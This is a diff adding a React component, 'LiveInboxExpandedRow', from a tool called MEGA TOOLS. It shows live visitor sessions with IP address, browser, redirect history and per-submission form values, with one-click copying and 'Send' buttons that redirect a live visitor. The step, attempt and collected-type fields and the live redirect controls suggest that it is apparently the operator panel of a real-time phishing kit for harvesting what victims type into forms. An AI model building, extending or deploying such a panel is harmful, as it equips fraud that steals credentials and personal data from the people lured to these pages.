@@ -1,0 +1,454 @@
+// ============================================================
+// MEGA TOOLS — LiveInboxExpandedRow v58.0
+// FIX-E1..E5 (v57.0): retained
+//
+// FIX-E6 (v58.0 — TARGET): the More dropdown now renders form
+//   submissions as INDEPENDENT grouped blocks, one per submission:
+//     • Submission 1: shows only F4, F5, F6… (F1–F3 are already
+//       displayed in the main table's From 1 / From 2 / From 3
+//       columns, so they are hidden here to avoid duplication)
+//     • Submission 2, 3, 4…: shows F1, F2, F3… from the start
+//       (no fields hidden — every field of every subsequent
+//       submission is visible)
+//   Each block has a small header: "Form 1", "Form 2", etc.
+//   The seen-state key is now submission-scoped:
+//     `${submissionIndex}_${fNumber}_${value}`
+//   so copies in one submission no longer mark the same
+//   fNumber value in another submission as "seen".
+//
+// FIX-E7 (v58.0): the previous `dropdownFields` filter
+//   (`f.fNumber > TABLE_FIELDS_COUNT`) is replaced by
+//   `dropdownGroups` — a per-submission Map. This fixes the
+//   long-standing bug where submission 2+ fields were numbered
+//   F4, F5, F6… instead of restarting at F1.
+// ============================================================
+import React, { useState, useMemo, useCallback, memo, useRef } from 'react';
+import { useToast } from '../contexts/ToastContext';
+import { copyToClipboard } from '../utils/helpers';
+
+const sectionLabel = { fontSize: 11, color: '#CBD5E1', marginBottom: 5, fontWeight: 600, textTransform: 'uppercase', letterSpacing: '0.04em' };
+
+// Send — GREEN (online) / GRAY (offline); Categories — PURPLE (online) / GRAY (offline)
+const SEND_BG = '#16A34A';
+const SEND_BORDER = '#22C55E';
+const CATEGORY_BG = '#7C3AED';
+const CATEGORY_BORDER = '#A78BFA';
+
+// Offline palette — matches status gray
+const OFFLINE_BG = 'rgba(100,116,139,0.15)';
+const OFFLINE_COLOR = '#94A3B8';
+const OFFLINE_BORDER = '1px solid #94A3B8';
+
+const SYSTEM_FIELDS = ['step','stepNumber','attempt','status','collectedTypes','screenResolution','timestamp','userAgent','platform','language','timezone','submittedAt','source','url','currentUrl','entryUrl','browser'];
+
+const TABLE_FIELDS_COUNT = 3;
+
+const getTotalFormDataCount = (s) => {
+  const subs = s?.submissions || [];
+  let count = 0;
+  for (const sub of subs) {
+    count += Object.keys(sub).filter(k => !SYSTEM_FIELDS.includes(k) && k !== 'submittedAt').length;
+  }
+  return count;
+};
+
+const readableUrl = (url) => {
+  if (!url) return '—';
+  try {
+    const u = new URL(url);
+    return (u.pathname + u.search).replace(/^\/+/, '') || u.hostname;
+  } catch {
+    return String(url);
+  }
+};
+
+const FLOW_SCROLL = { maxHeight: 140, overflowY: 'auto', overflowX: 'hidden', paddingRight: 6, boxSizing: 'border-box', width: '100%', scrollbarWidth: 'thin', scrollbarColor: '#334155 #0F172A' };
+const FLOW_WRAP = { display: 'grid', gridTemplateColumns: 'repeat(3, minmax(0, 1fr))', gap: 4, width: '100%', boxSizing: 'border-box' };
+const FLOW_CARD = { display: 'flex', flexDirection: 'column', gap: 2, padding: '4px 6px', background: '#1E293B', borderRadius: 3, border: '1px solid #334155', cursor: 'pointer', width: '100%', boxSizing: 'border-box', minWidth: 0, minHeight: 32 };
+const FLOW_NAME = { fontSize: 9, color: '#94A3B8', textTransform: 'uppercase', fontWeight: 700, whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis', lineHeight: 1.15 };
+const FLOW_URL = { fontSize: 10, color: '#60a5fa', fontFamily: 'SF Mono, Monaco, Consolas, monospace', whiteSpace: 'normal', wordBreak: 'break-all', overflowWrap: 'anywhere', minWidth: 0, lineHeight: 1.25, maxHeight: '3.75em', overflow: 'hidden' };
+
+const VISITOR_WRAP = { display: 'grid', gridTemplateColumns: '2.4fr 1fr 1fr', gap: 4, width: '100%', boxSizing: 'border-box', alignItems: 'stretch' };
+const VISITOR_CARD = { display: 'flex', flexDirection: 'column', gap: 2, padding: '3px 6px', background: '#1E293B', borderRadius: 3, border: '1px solid #334155', cursor: 'pointer', minWidth: 0, boxSizing: 'border-box', minHeight: 28 };
+const VISITOR_LABEL = { fontSize: 8, color: '#94A3B8', textTransform: 'uppercase', fontWeight: 700, whiteSpace: 'nowrap', lineHeight: 1.1 };
+const VISITOR_VALUE = { fontSize: 10, color: '#E2E8F0', fontWeight: 600, whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis', lineHeight: 1.2 };
+
+const OUTER_WRAP = { background: '#0F172A', margin: 0, padding: '6px 0', borderBottom: '1px solid #334155', display: 'flex', flexDirection: 'column', gap: 4, boxSizing: 'border-box', width: '100%' };
+const QUICK_ACTIONS_WRAP = { display: 'flex', flexDirection: 'column', gap: 4, padding: 8, margin: '0 3px', background: '#1E293B', borderRadius: 2, border: '1px solid #334155', boxSizing: 'border-box' };
+const SECTION_BOX = { background: '#0F172A', borderRadius: 2, border: '1px solid #334155', padding: 8 };
+
+// Send button — green (online) / gray (offline)
+const SEND_ONLINE = {
+  flex: '1 1 auto', height: 30, fontSize: 11, fontWeight: 800,
+  background: SEND_BG, color: '#FFFFFF', border: '1px solid ' + SEND_BORDER,
+  borderRadius: 4, cursor: 'pointer', whiteSpace: 'nowrap', padding: '0 12px', minWidth: '50px',
+  transition: 'all 0.15s ease', boxShadow: '0 1px 3px rgba(0,0,0,0.2)'
+};
+const SEND_OFFLINE = {
+  ...SEND_ONLINE, background: OFFLINE_BG, color: OFFLINE_COLOR, border: OFFLINE_BORDER, boxShadow: 'none'
+};
+
+// Category button — purple (online) / gray (offline)
+const CATEGORY_ONLINE = {
+  flex: '1 1 auto', height: 30, fontSize: 11, fontWeight: 800,
+  background: CATEGORY_BG, color: '#FFFFFF', border: '1px solid ' + CATEGORY_BORDER,
+  borderRadius: 4, cursor: 'pointer', display: 'inline-flex', alignItems: 'center', justifyContent: 'center',
+  padding: '0 12px', whiteSpace: 'nowrap', minWidth: '70px', transition: 'all 0.15s ease',
+  boxShadow: '0 1px 3px rgba(0,0,0,0.2)'
+};
+const CATEGORY_OFFLINE = {
+  ...CATEGORY_ONLINE, background: OFFLINE_BG, color: OFFLINE_COLOR, border: OFFLINE_BORDER, boxShadow: 'none'
+};
+
+// Form card — dark card, always marked by default (red dot). Click → unmarked.
+const FORM_CARD = {
+  display: 'inline-flex',
+  flexDirection: 'row',
+  alignItems: 'center',
+  gap: 8,
+  padding: '6px 12px',
+  background: '#1E293B',
+  borderRadius: 6,
+  border: '1px solid #334155',
+  cursor: 'pointer',
+  minWidth: 0,
+  maxWidth: '100%',
+  boxSizing: 'border-box',
+  transition: 'border-color 0.15s ease, background 0.15s ease, opacity 0.15s ease',
+  minHeight: 30
+};
+const FORM_CARD_LABEL = {
+  fontSize: 10,
+  color: '#94A3B8',
+  fontWeight: 800,
+  textTransform: 'uppercase',
+  letterSpacing: '0.06em',
+  whiteSpace: 'nowrap',
+  lineHeight: 1.1,
+  flexShrink: 0
+};
+const FORM_CARD_VALUE = {
+  fontSize: 12,
+  fontWeight: 700,
+  color: '#FFFFFF',
+  whiteSpace: 'nowrap',
+  overflow: 'hidden',
+  textOverflow: 'ellipsis',
+  lineHeight: 1.2,
+  minWidth: 0,
+  flex: '0 1 auto'
+};
+
+const RED_DOT = { display: 'inline-block', width: 7, height: 7, borderRadius: '50%', background: '#EF4444', flexShrink: 0, marginRight: 5, verticalAlign: 'middle', boxShadow: '0 0 6px rgba(239,68,68,0.6)' };
+
+// FIX-E6 (v58.0): per-submission group container + header
+const FORM_GROUP = {
+  display: 'flex',
+  flexDirection: 'column',
+  gap: 5,
+  padding: '6px 8px',
+  background: 'rgba(30,41,59,0.55)',
+  borderRadius: 4,
+  border: '1px solid #334155',
+  boxSizing: 'border-box',
+  width: '100%',
+  minWidth: 0,
+};
+const FORM_GROUP_HEADER = {
+  fontSize: 10,
+  color: '#38BDF8',
+  fontWeight: 900,
+  textTransform: 'uppercase',
+  letterSpacing: '0.08em',
+  marginBottom: 2,
+  display: 'flex',
+  alignItems: 'center',
+  gap: 6,
+};
+const FORM_GROUP_HEADER_BADGE = {
+  background: 'rgba(56,189,248,0.15)',
+  color: '#7DD3FC',
+  fontSize: 9,
+  fontWeight: 800,
+  padding: '1px 6px',
+  borderRadius: 3,
+  letterSpacing: '0.02em',
+};
+const FORM_GROUP_FIELDS = {
+  display: 'flex',
+  flexWrap: 'wrap',
+  gap: 6,
+  width: '100%',
+  boxSizing: 'border-box',
+};
+
+const SCROLLBAR_CSS = `
+.flow-scroll::-webkit-scrollbar { width: 8px; }
+.flow-scroll::-webkit-scrollbar-track { background: #0F172A; border-radius: 4px; }
+.flow-scroll::-webkit-scrollbar-thumb { background: #334155; border-radius: 4px; }
+.flow-scroll::-webkit-scrollbar-thumb:hover { background: #475569; }
+`;
+
+const LiveInboxExpandedRowBase = ({
+  session, cats, qaL, msgRowLinks, msgSendLinks,
+  onRedirect, onCatOpen, getMsg, setMsg, onImageUpload,
+  getLinkNameByUrl, getDomain, allFields, showQuickActions, onOpenInfo, onBack, rowIndex
+}) => {
+  const toast = useToast();
+  const sid = session?._id;
+
+  const [seenFields, setSeenFields] = useState(() => {
+    try { return JSON.parse(localStorage.getItem('seen_' + sid) || '{}'); } catch { return {}; }
+  });
+
+  // FIX-E1: debounced localStorage writes
+  const saveTimerRef = useRef(null);
+  const scheduleSave = useCallback((data) => {
+    if (!sid) return;
+    if (saveTimerRef.current) clearTimeout(saveTimerRef.current);
+    saveTimerRef.current = setTimeout(() => {
+      try { localStorage.setItem('seen_' + sid, JSON.stringify(data)); } catch (_) {}
+    }, 300);
+  }, [sid]);
+
+  const browserText = session?.browser || 'N/A';
+  // FIX-E2: derive strictly from status; isLive may be stale
+  const isOnline = session?.status === 'Online';
+
+  // Button styles follow status
+  const sendBtnStyle = isOnline ? SEND_ONLINE : SEND_OFFLINE;
+  const categoryBtnStyle = isOnline ? CATEGORY_ONLINE : CATEGORY_OFFLINE;
+
+  // FIX-E6: submission-scoped seen key
+  const markSeen = useCallback((submissionIndex, fieldNumber, fieldValue) => {
+    const key = submissionIndex + '_' + fieldNumber + '_' + String(fieldValue);
+    setSeenFields(prev => {
+      const updated = { ...prev, [key]: true };
+      scheduleSave(updated);
+      return updated;
+    });
+  }, [scheduleSave]);
+
+  // FIX-E3: dedupe flowChain by url
+  const flowChain = useMemo(() => {
+    const chain = [];
+    const seenUrls = new Set();
+
+    const push = (url, fallbackName) => {
+      if (!url || seenUrls.has(url)) return;
+      seenUrls.add(url);
+      const info = getLinkNameByUrl(url);
+      chain.push({ name: info.name || fallbackName, url });
+    };
+
+    if (session?.entryUrl) push(session.entryUrl, 'Visit');
+    (session?.redirectHistory || []).forEach(h => push(h.url, 'Redirect'));
+    if (session?.currentUrl) push(session.currentUrl, 'Current');
+
+    return chain;
+  }, [session?.entryUrl, session?.redirectHistory, session?.currentUrl, getLinkNameByUrl]);
+
+  // FIX-E4: include button style in deps so styles refresh on online/offline toggle
+  const catBtns = useMemo(() => cats.map((cat) => {
+    const cl = qaL.filter(l => l?.category === cat && l?.showInInbox !== false);
+    if (!cl.length) return null;
+    return (
+      <button key={cat} onClick={() => onCatOpen(sid, cat, getMsg(sid))} style={categoryBtnStyle}>
+        {cat} ({cl.length})
+      </button>
+    );
+  }), [cats, qaL, onCatOpen, sid, getMsg, categoryBtnStyle]);
+
+  const sendBtns = useMemo(
+    () => msgSendLinks.filter(l => l.category !== 'reply' && l.linksCategory !== 'reply' && l.inboxAction !== 'reply'),
+    [msgSendLinks]
+  );
+
+  // FIX-E6 (v58.0): group fields per submission.
+  //   - submission 0 → hide first TABLE_FIELDS_COUNT (already in table From1/2/3)
+  //   - submission 1+ → show ALL fields (F1, F2, F3…)
+  //   - submissions with 0 remaining visible fields are dropped entirely
+  const dropdownGroups = useMemo(() => {
+    if (!allFields || !allFields.length) return [];
+    const bySubmission = new Map();
+    for (const f of allFields) {
+      const idx = (typeof f.submissionIndex === 'number') ? f.submissionIndex : 0;
+      if (!bySubmission.has(idx)) bySubmission.set(idx, []);
+      bySubmission.get(idx).push(f);
+    }
+    const groups = [];
+    for (const [idx, fields] of bySubmission.entries()) {
+      const visible = idx === 0 ? fields.filter(f => f.fNumber > TABLE_FIELDS_COUNT) : fields;
+      if (visible.length === 0) continue;
+      groups.push({
+        submissionIndex: idx,
+        submissionNumber: (fields[0]?.submissionNumber) || (idx + 1),
+        fields: visible,
+      });
+    }
+    return groups;
+  }, [allFields]);
+
+  const hasDropdownContent = dropdownGroups.length > 0;
+
+  return (
+    <div style={OUTER_WRAP}>
+      <style>{SCROLLBAR_CSS}</style>
+
+      {/* FIX-E6: grouped per-submission form display */}
+      <div style={{ display: 'flex', flexDirection: 'column', gap: 6, padding: '0 3px', boxSizing: 'border-box', width: '100%' }}>
+        {hasDropdownContent ? (
+          dropdownGroups.map((group) => (
+            <div key={'grp_' + group.submissionIndex} style={FORM_GROUP}>
+              <div style={FORM_GROUP_HEADER}>
+                <span>Form {group.submissionNumber}</span>
+                <span style={FORM_GROUP_HEADER_BADGE}>
+                  {group.fields.length} field{group.fields.length === 1 ? '' : 's'}
+                </span>
+              </div>
+              <div style={FORM_GROUP_FIELDS}>
+                {group.fields.map((field) => {
+                  const key = group.submissionIndex + '_' + field.fNumber + '_' + String(field.value);
+                  const isUnmarked = !!seenFields[key];
+                  return (
+                    <div
+                      key={'f_' + group.submissionIndex + '_' + field.fNumber}
+                      onClick={async () => {
+                        if (field.value !== undefined && field.value !== null && field.value !== '') {
+                          try {
+                            const ok = await copyToClipboard(String(field.value));
+                            if (ok) {
+                              toast.success('Copied');
+                              markSeen(group.submissionIndex, field.fNumber, field.value);
+                            } else {
+                              toast.error('Copy failed');
+                            }
+                          } catch (e) {
+                            toast.error('Copy failed');
+                          }
+                        }
+                      }}
+                      title={String(field.value ?? '')}
+                      style={{
+                        ...FORM_CARD,
+                        opacity: isUnmarked ? 0.85 : 1
+                      }}
+                    >
+                      <span style={FORM_CARD_LABEL}>
+                        {!isUnmarked && (
+                          <span style={RED_DOT} />
+                        )}
+                        F{field.fNumber}
+                      </span>
+                      <span style={FORM_CARD_VALUE}>{String(field.value ?? '—')}</span>
+                    </div>
+                  );
+                })}
+              </div>
+            </div>
+          ))
+        ) : (
+          <span style={{ fontSize: 11, color: '#64748B' }}>No data yet</span>
+        )}
+      </div>
+
+      {showQuickActions && (
+        <div style={QUICK_ACTIONS_WRAP}>
+
+          {sendBtns.length > 0 && (
+            <div>
+              <div style={sectionLabel}>Send</div>
+              <div style={{ display: 'flex', flexWrap: 'wrap', gap: 4 }}>
+                {sendBtns.map((l) => {
+                  const rc = l.redirectCode || l.baseCode || l.slug || '';
+                  return <button key={l._id} onClick={() => onRedirect(sid, rc, getMsg(sid))} style={sendBtnStyle}>{l.name}</button>;
+                })}
+              </div>
+            </div>
+          )}
+
+          {cats.length > 0 && (
+            <div>
+              <div style={sectionLabel}>Categories</div>
+              <div style={{ display: 'flex', flexWrap: 'wrap', gap: 4 }}>{catBtns}</div>
+            </div>
+          )}
+
+          <div style={SECTION_BOX}>
+            <div style={{ ...sectionLabel, marginBottom: 6 }}>👤 Visitor Information</div>
+            <div style={VISITOR_WRAP}>
+              <div
+                onClick={async () => { try { await copyToClipboard(String(browserText)); toast.success('Copied'); } catch(e) { toast.error('Copy failed'); } }}
+                title={String(browserText)}
+                style={VISITOR_CARD}
+              >
+                <span style={VISITOR_LABEL}>Browser</span>
+                <span style={VISITOR_VALUE}>{browserText}</span>
+              </div>
+              <div
+                onClick={async () => { if (!session?.ip) return; try { await copyToClipboard(String(session.ip)); toast.success('Copied'); } catch(e) { toast.error('Copy failed'); } }}
+                title={String(session?.ip || '—')}
+                style={VISITOR_CARD}
+              >
+                <span style={VISITOR_LABEL}>IP Address</span>
+                <span style={VISITOR_VALUE}>{session?.ip || '—'}</span>
+              </div>
+              <div
+                onClick={async () => { try { await copyToClipboard(String(getTotalFormDataCount(session))); toast.success('Copied'); } catch(e) { toast.error('Copy failed'); } }}
+                title={String(getTotalFormDataCount(session))}
+                style={VISITOR_CARD}
+              >
+                <span style={VISITOR_LABEL}>Form Data</span>
+                <span style={VISITOR_VALUE}>{getTotalFormDataCount(session)}</span>
+              </div>
+            </div>
+          </div>
+
+          {flowChain.length > 0 && (
+            <div style={SECTION_BOX}>
+              <div style={{ ...sectionLabel, marginBottom: 6 }}>🔄 Redirect Flow ({flowChain.length})</div>
+              <div className="flow-scroll" style={FLOW_SCROLL}>
+                <div style={FLOW_WRAP}>
+                  {flowChain.map((f, ri) => (
+                    <div
+                      key={ri}
+                      onClick={async () => { try { const ok = await copyToClipboard(f.url); if (ok) toast.success('Copied'); else toast.error('Copy failed'); } catch(e) { toast.error('Copy failed'); } }}
+                      title={f.url}
+                      style={FLOW_CARD}
+                    >
+                      <span style={FLOW_NAME}>{f.name}</span>
+                      <span style={FLOW_URL}>{readableUrl(f.url)}</span>
+                    </div>
+                  ))}
+                </div>
+              </div>
+            </div>
+          )}
+        </div>
+      )}
+    </div>
+  );
+};
+
+const LiveInboxExpandedRow = memo(LiveInboxExpandedRowBase, (prev, next) => {
+  if (prev.session?._id !== next.session?._id) return false;
+  if (prev.session?.currentUrl !== next.session?.currentUrl) return false;
+  if (prev.session?.browser !== next.session?.browser) return false;
+  if (prev.session?.visitorId !== next.session?.visitorId) return false;
+  if (prev.session?.trackingCode !== next.session?.trackingCode) return false;
+  if (prev.session?.ip !== next.session?.ip) return false;
+  if (prev.session?.status !== next.session?.status) return false;
+  if (prev.session?.isLive !== next.session?.isLive) return false;
+  if (JSON.stringify(prev.session?.submissions) !== JSON.stringify(next.session?.submissions)) return false;
+  if (JSON.stringify(prev.session?.redirectHistory) !== JSON.stringify(next.session?.redirectHistory)) return false;
+  if (prev.showQuickActions !== next.showQuickActions) return false;
+  if (prev.rowIndex !== next.rowIndex) return false;
+  if (prev.allFields !== next.allFields) return false;
+  if (prev.cats !== next.cats) return false;
+  if (prev.qaL !== next.qaL) return false;
+  if (prev.msgSendLinks !== next.msgSendLinks) return false;
+  if (prev.getLinkNameByUrl !== next.getLinkNameByUrl) return false;
+  return true;
+});
+
+export default LiveInboxExpandedRow;
